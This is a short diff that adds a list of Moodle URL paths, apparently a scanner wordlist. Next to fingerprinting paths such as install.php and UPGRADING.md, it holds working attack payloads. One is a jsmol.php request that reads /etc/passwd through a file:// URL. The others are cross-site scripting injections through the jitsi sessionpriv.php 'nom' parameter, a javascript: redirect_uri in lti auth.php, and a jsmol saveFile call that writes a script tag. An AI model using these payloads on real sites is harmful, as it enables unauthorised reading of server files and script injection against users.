@@ -1,0 +1,8 @@
+/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
+/install.php
+/login/index.php
+/lib/upgrade.txt
+/UPGRADING.md
+/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1
+/mod/lti/auth.php?redirect_uri=javascript:alert(
+/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html
